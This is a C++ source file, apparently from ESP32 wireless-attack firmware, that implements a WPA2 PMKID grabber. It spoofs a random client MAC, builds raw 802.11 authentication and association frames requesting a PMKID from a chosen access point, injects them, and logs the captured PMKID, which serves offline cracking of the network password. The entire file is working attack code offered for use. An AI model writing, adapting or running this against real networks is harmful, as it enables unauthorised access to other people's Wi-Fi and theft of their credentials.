#include "PMKIDGrabber.h"
#include "EapolSniffer.h"
#include "networkKit.h"
#include "logger.h"
#include <esp_wifi.h>
#include <SD.h>

bool GrabPMKIDForAP(const uint8_t* apBSSID, const String& ssid, int channel, int attempts, int delayMs, int timeoutMs) {
    if (!apBSSID) return false;

    // Prepare sniffer
    setTargetAP((uint8_t*)apBSSID, ssid);
    clearPMKIDFlag();
    if (!SnifferBegin(channel, true)) {
        logMessage("PMKIDGrabber: Failed to start sniffer");
        return false;
    }

    // Generate a random client MAC (locally administered)
    uint8_t client_mac[6];
    for (int i = 0; i < 6; i++) client_mac[i] = random(256);
    client_mac[0] = (client_mac[0] & 0xFE) | 0x02; // locally administered

    // Fill auth frame (simple open system)
    uint8_t auth_frame[26] = {
        0xB0, 0x00, // Mgmt Auth
        0x00, 0x00, // Duration
        // DA (AP)
        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
        // SA (Client)
        client_mac[0], client_mac[1], client_mac[2], client_mac[3], client_mac[4], client_mac[5],
        // BSSID (AP)
        apBSSID[0], apBSSID[1], apBSSID[2], apBSSID[3], apBSSID[4], apBSSID[5],
        0x00, 0x00, // Sequence
        0x00, 0x01  // Auth algorithm 0 (Open), seq 1
    };

    // Association Request with RSN PMKID request - base template
    uint8_t assoc_req[200];
    memset(assoc_req, 0x00, sizeof(assoc_req));
    // Basic header
    assoc_req[0] = 0x00; assoc_req[1] = 0x00; // Assoc Req
    // duration
    assoc_req[2] = 0x00; assoc_req[3] = 0x00;
    // DA (AP)
    memcpy(&assoc_req[4], apBSSID, 6);
    // SA (Client)
    memcpy(&assoc_req[10], client_mac, 6);
    // BSSID (AP)
    memcpy(&assoc_req[16], apBSSID, 6);
    // Seq/fragment
    assoc_req[22] = 0x10; assoc_req[23] = 0x00;
    // Fixed params: capability (ESS + Privacy)
    assoc_req[24] = 0x11; assoc_req[25] = 0x00;
    // Listen interval
    assoc_req[26] = 0x00; assoc_req[27] = 0x10;

    // SSID tag
    int pos = 28;
    assoc_req[pos++] = 0x00;
    assoc_req[pos++] = ssid.length();
    for (size_t i = 0; i < ssid.length() && i < 32; i++) {
        assoc_req[pos++] = ssid[i];
    }

    // Supported rates tag (8 bytes)
    assoc_req[pos++] = 0x01; assoc_req[pos++] = 0x08;
    uint8_t rates[] = {0x82,0x84,0x8b,0x96,0x0c,0x12,0x18,0x24};
    memcpy(&assoc_req[pos], rates, sizeof(rates)); pos += sizeof(rates);

    // Extended rates
    assoc_req[pos++] = 0x32; assoc_req[pos++] = 0x04;
    uint8_t erates[] = {0x30,0x48,0x60,0x6c};
    memcpy(&assoc_req[pos], erates, sizeof(erates)); pos += sizeof(erates);

    // RSN IE (PMKID request) - 32 bytes
    uint8_t rsn_ie[] = {
        0x30, 0x20, // Tag 48, length 32
        0x01, 0x00, // Version 1
        0x00, 0x0f, 0xac, 0x04, // Group cipher: CCMP
        0x02, 0x00, // Pairwise suite count: 1
        0x00, 0x0f, 0xac, 0x04, // Pairwise: CCMP
        0x01, 0x00, // AKM suite count: 1
        0x00, 0x0f, 0xac, 0x02, // AKM: PSK
        0x00, 0x00, // RSN capabilities
        0x01, 0x00, // PMKID count: 1 (REQUEST!)
        0x00, 0x00, 0x00, 0x00 // Empty PMKID list (requests from AP)
    };
    memcpy(&assoc_req[pos], rsn_ie, sizeof(rsn_ie)); pos += sizeof(rsn_ie);

    int assoc_len = pos;

    logMessage("Starting PMKID grabber against: " + macToString(apBSSID));

    // send frames
    for (int i = 0; i < attempts && !pmkidFound; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, auth_frame, sizeof(auth_frame), false);
        vTaskDelay(delayMs / portTICK_PERIOD_MS);
    }
    vTaskDelay(50 / portTICK_PERIOD_MS);
    for (int i = 0; i < attempts && !pmkidFound; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, assoc_req, assoc_len, false);
        vTaskDelay(delayMs / portTICK_PERIOD_MS);
    }

    // wait for detection or timeout
    unsigned long start = millis();
    while (!pmkidFound && (millis() - start < (unsigned long)timeoutMs)) {
        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    SnifferEnd();

    if (pmkidFound) {
        logMessage("PMKIDGrabber: PMKID captured: " + pmkidLastValue);
        return true;
    }
    logMessage("PMKIDGrabber: No PMKID captured.");
    return false;
}
